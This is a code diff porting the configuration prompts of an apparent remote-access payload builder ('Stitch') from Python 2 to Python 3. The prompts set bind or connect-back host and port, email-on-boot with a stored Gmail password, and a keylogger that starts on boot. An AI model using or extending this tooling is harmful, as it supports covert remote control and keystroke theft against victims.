@@ -42,19 +42,19 @@ def create_new_config():
 
     st_bind = ''
     while st_bind != "y" and st_bind != "yes" and st_bind != "n" and st_bind != "no":
-        st_bind = raw_input('\nWould you like the payload to bind itself? [Y/N]: ').lower()
+        st_bind = input('\nWould you like the payload to bind itself? [Y/N]: ').lower()
     if st_bind.startswith('y'):
         BIND = True
     elif st_bind.startswith('n'):
         BIND = False
 
     if BIND:
-        st_bhost = raw_input('\nEnter the host IP you want the payload to bind to. (Leave empty to allow all IPs): ').lower()
+        st_bhost = input('\nEnter the host IP you want the payload to bind to. (Leave empty to allow all IPs): ').lower()
         BHOST = st_bhost
 
-        st_bport = raw_input('Enter the port you want the payload to bind itself to?: ').lower()
+        st_bport = input('Enter the port you want the payload to bind itself to?: ').lower()
         while not check_int(st_bport):
-            st_bport = raw_input('\nEnter the port you want the payload to bind itself to?: ').lower()
+            st_bport = input('\nEnter the port you want the payload to bind itself to?: ').lower()
         BPORT = st_bport
     else:
         BHOST = ""
@@ -62,19 +62,19 @@ def create_new_config():
 
     st_conn = ''
     while st_conn != "y" and st_conn != "yes" and st_conn != "n" and st_conn != "no":
-        st_conn = raw_input('\nWould you like the payload to connect to a host? [Y/N]:  ').lower()
+        st_conn = input('\nWould you like the payload to connect to a host? [Y/N]:  ').lower()
     if st_conn.startswith('y'):
         LISTEN = True
     elif st_conn.startswith('n'):
         LISTEN = False
 
     if LISTEN:
-        st_chost = raw_input('\nEnter the host IP you want the payload to connect to: ').lower()
+        st_chost = input('\nEnter the host IP you want the payload to connect to: ').lower()
         LHOST = st_chost
 
-        st_cport = raw_input('Enter the port on "{}" that you want the payload to connect to: '.format(st_chost)).lower()
+        st_cport = input('Enter the port on "{}" that you want the payload to connect to: '.format(st_chost)).lower()
         while not check_int(st_cport):
-            st_cport = raw_input('Enter the port on "{}" that you want the payload to connect to: '.format(st_chost)).lower()
+            st_cport = input('Enter the port on "{}" that you want the payload to connect to: '.format(st_chost)).lower()
         LPORT = st_cport
     else:
         LHOST = ""
@@ -82,7 +82,7 @@ def create_new_config():
 
     st_email = ''
     while st_email != "y" and st_email != "yes" and st_email != "n" and st_email != "no":
-        st_email = raw_input('\nWould you like the payload to email you on boot? [Y/N]:  ').lower()
+        st_email = input('\nWould you like the payload to email you on boot? [Y/N]:  ').lower()
     if st_email.startswith('y'):
         EMAIL = True
     elif st_email.startswith('n'):
@@ -90,17 +90,17 @@ def create_new_config():
 
     if EMAIL:
         while True:
-            GMAIL_USER = raw_input('\nEnter a valid gmail address you want the payload to use: ').lower()
+            GMAIL_USER = input('\nEnter a valid gmail address you want the payload to use: ').lower()
             if '@gmail.com' in GMAIL_USER:
                 break
-        GMAIL_PWD = base64.b64encode(getpass('Enter your email password for {}: '.format(GMAIL_USER)))
+        GMAIL_PWD = base64.b64encode(getpass('Enter your email password for {}: '.format(GMAIL_USER)).encode()).decode()
     else:
         GMAIL_USER = "None"
         GMAIL_PWD = ""
 
     st_klboot = ''
     while st_klboot != "y" and st_klboot != "yes" and st_klboot != "n" and st_klboot != "no":
-        st_klboot = raw_input('\nWould you like the keylogger to start on boot? [Y/N]:  ').lower()
+        st_klboot = input('\nWould you like the keylogger to start on boot? [Y/N]:  ').lower()
     if st_klboot.startswith('y'):
         KEYLOGGER_BOOT = True
     elif st_klboot.startswith('n'):
@@ -122,7 +122,7 @@ def create_new_config():
 def confirm_config():
     clear_screen()
     print_st_config()
-    cur_config = raw_input("Would you like to use the current configurations? [Y/N]: ").lower()
+    cur_config = input("Would you like to use the current configurations? [Y/N]: ").lower()
     if cur_config.startswith('yes') or cur_config == 'y':
         return True
     elif cur_config.startswith('no') or cur_config == 'n':
@@ -137,10 +137,10 @@ def get_conf_dir():
     conf_dir = os.path.join(payloads_path,'config{}'.format(i))
     os.makedirs(conf_dir)
 
-    with open(st_config,'rb') as sc:
+    with open(st_config,'r') as sc:
         content=sc.read()
         content += "AES Encryption Key: {}".format(aes_encoded)
-        with open(os.path.join(conf_dir,'PAYLOAD_CONFIG.log'),'wb') as pc:
+        with open(os.path.join(conf_dir,'PAYLOAD_CONFIG.log'),'w') as pc:
             pc.write(content)
 
     return conf_dir
@@ -159,7 +159,7 @@ def print_st_config():
     EMAIL = stini.get_value("EMAIL")
     KEYLOGGER_BOOT = stini.get_bool("KEYLOGGER_BOOT")
     st_print("=== Stitch {} Configuration ===".format(stini.section))
-    print '''
+    print('''
     BIND = {}
     BHOST = {}
     BPORT = {}
@@ -169,10 +169,10 @@ def print_st_config():
     LPORT = {}
 
     GMAIL = {}
-    KEYLOGGER_BOOT = {}\n\n'''.format(BIND,BHOST,BPORT,LISTEN,LHOST,LPORT,EMAIL,KEYLOGGER_BOOT)
+    KEYLOGGER_BOOT = {}\n\n'''.format(BIND,BHOST,BPORT,LISTEN,LHOST,LPORT,EMAIL,KEYLOGGER_BOOT))
 
 def gen_default_st_config():
-    with open(st_config, 'wb') as sc:
+    with open(st_config, 'w') as sc:
         content = '''
 [Windows]
 BIND = True
